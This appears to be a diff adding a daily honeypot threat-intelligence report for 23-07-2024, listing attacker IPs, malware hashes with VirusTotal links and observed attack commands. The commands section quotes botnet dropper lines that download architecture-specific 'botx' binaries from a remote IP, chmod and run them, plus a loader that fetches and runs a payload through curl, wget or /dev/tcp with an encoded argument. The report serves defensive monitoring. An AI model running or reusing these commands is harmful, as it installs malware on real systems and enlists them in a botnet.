@@ -1,0 +1,27 @@
+Top 5 IPs for 23-07-2024 :
+
+132.148.73.98
+47.108.117.104
+182.56.199.172
+113.24.185.217
+138.75.250.116
+
+Malware Observed:
+
+
+59c176301eae9eb5ba816276563636b63dc78795aaaaecea6ee4759cca566bb1
+https://www.virustotal.com/gui/file/59c176301eae9eb5ba816276563636b63dc78795aaaaecea6ee4759cca566bb1
+
+52022b849f181cdd4e2a256c9e3582ca0724c30b68a6db66423502516d1abf66
+https://www.virustotal.com/gui/file/52022b849f181cdd4e2a256c9e3582ca0724c30b68a6db66423502516d1abf66
+
+c26a29798752a80de5cf9f2e2bc9d1f1a780b93ca4ed2edf6e18c2d8d4308610
+https://www.virustotal.com/gui/file/c26a29798752a80de5cf9f2e2bc9d1f1a780b93ca4ed2edf6e18c2d8d4308610
+
+
+Commands/exploits observed:
+
+wget http://103.162.20.69/where/botx.arm; chmod 777 botx.arm; ./botx.arm android\nwget http://103.162.20.69/where/botx.arm5; chmod 777 botx.arm5; ./botx.arm5 android\nwget http://103.162.20.69/where/botx.arm6; chmod 777 botx.arm6; ./botx.arm6 android\nwget http://103.162.20.69/where/botx.arm7; chmod 777 botx.arm7; ./botx.arm7 android\nwget http://103.162.20.69/where/botx.m68k; chmod 777 botx.m68k; ./botx.m68k android\nwget http://103.162.20.69/where/botx.mips; chmod 777 botx.mips; ./botx.mips android\nwget http://103.162.20.69/where/botx.mpsl; chmod 777 botx.mpsl; ./botx.mpsl android\nwget http://103.162.20.69/where/botx.ppc; chmod 777 botx.ppc; ./botx.ppc android\nwget http://103.162.20.69/where/botx.sh4; chmod 777 botx.sh4; ./botx.sh4 android\nwget http://103.162.20.69/where/botx.spc; chmod 777 botx.spc; ./botx.spc android\nwget http://103.162.20.69/where/botx.x86; chmod 777 botx.x86; ./botx.x86 android\nwget http://103.162.20.69/where/botx.x86_64; chmod 777 botx.x86_64; ./botx.x86_64 android\n\nrm $0
+
+
+nohup $SHELL -c "curl http://66.206.39.42:60103/arm_linux -o /tmp/Ol1M5NPwxB; if [ ! -f /tmp/Ol1M5NPwxB ]; then wget http://66.206.39.42:60103/arm_linux -O /tmp/Ol1M5NPwxB; fi; if [ ! -f /tmp/Ol1M5NPwxB ]; then exec 6<>/dev/tcp/66.206.39.42/60103 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/Ol1M5NPwxB && chmod +x /tmp/Ol1M5NPwxB && /tmp/Ol1M5NPwxB ZUnQxeGqorYzPoGIICmwpb7ux9BZHwhY08f2s6KsMj6ChSE9tKO16MLBWBAaR9DC6aqguykph4omN7OhsfjD1kcfHkfQz+mqpbc9JoCBIjKip7P2xdVcBhlZ0tnptaO4MSCBgykns6G09sDQRxgGX9HN7rSiszYwiJ4iNrK9vezZ01gdEl/Rxuyxs7Y+PoeDPj+2vbXuz9tfGBlZ0NfptaOsNiiFniE3sL2178DbXxgZWtDX6rWqrDYlgp4hPrK9sOzN11kZGl7Bw++qpLQpJ4eeIT+1qbLoxtJeCBBH08boqqq3KSGGiCoxsqKw4dfVXgYaXdLZ6bakrDAkioYgNrCmpO7Bz1sYHkfSzvawobgxIIGAIye6vbbpz89YHxtH2c/isqOzNiWQhCcpsKe39sTURxsfU9fH6bCkojYgg54hM7G9tuvOz1sfEl/Rxuyzs7QxPoKAJimxqqrsxdtfGBlZ0tfutb2zMSCegiE0rKG34c3XWRkYWMHD76qhtjQ+goIoKbOhtOLB0VgcGUnVxPa2p7ApIoCDPjaxpr7ux9BZGghd1tnvsr2zPyGehiU9tKO16sLBXR8GW9XC9rWjsSkhgYAqMbKit+HX1V4GGl3T2em8p6w2JoCKJjezob34w9JHGRtQz8LtqqSyPSaAgSM+oqK14dnVXAYbXM/F7LKptDchgIcwNLS9sOnZ0FEfBlvRx+Kyo7MzKZCEJymwoLP2wc9YGRFT18fptqCiNiGAniE/ur226dnTWhwSX9HG6ryzszIknog+NrajqunG11MeGFjRzpE4eZ7JSyB7uBw2hgy/+bPPEWmYUblJXw==; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/Ol1M5NPwxB && /tmp/Ol1M5NPwxB ZUnQxeGqorYzPoGIICmwpb7ux9BZHwhY08f2s6KsMj6ChSE9tKO16MLBWBAaR9DC6aqguykph4omN7OhsfjD1kcfHkfQz+mqpbc9JoCBIjKip7P2xdVcBhlZ0tnptaO4MSCBgykns6G09sDQRxgGX9HN7rSiszYwiJ4iNrK9vezZ01gdEl/Rxuyxs7Y+PoeDPj+2vbXuz9tfGBlZ0NfptaOsNiiFniE3sL2178DbXxgZWtDX6rWqrDYlgp4hPrK9sOzN11kZGl7Bw++qpLQpJ4eeIT+1qbLoxtJeCBBH08boqqq3KSGGiCoxsqKw4dfVXgYaXdLZ6bakrDAkioYgNrCmpO7Bz1sYHkfSzvawobgxIIGAIye6vbbpz89YHxtH2c/isqOzNiWQhCcpsKe39sTURxsfU9fH6bCkojYgg54hM7G9tuvOz1sfEl/Rxuyzs7QxPoKAJimxqqrsxdtfGBlZ0tfutb2zMSCegiE0rKG34c3XWRkYWMHD76qhtjQ+goIoKbOhtOLB0VgcGUnVxPa2p7ApIoCDPjaxpr7ux9BZGghd1tnvsr2zPyGehiU9tKO16sLBXR8GW9XC9rWjsSkhgYAqMbKit+HX1V4GGl3T2em8p6w2JoCKJjezob34w9JHGRtQz8LtqqSyPSaAgSM+oqK14dnVXAYbXM/F7LKptDchgIcwNLS9sOnZ0FEfBlvRx+Kyo7MzKZCEJymwoLP2wc9YGRFT18fptqCiNiGAniE/ur226dnTWhwSX9HG6ryzszIknog+NrajqunG11MeGFjRzpE4eZ7JSyB7uBw2hgy/+bPPEWmYUblJXw==" &
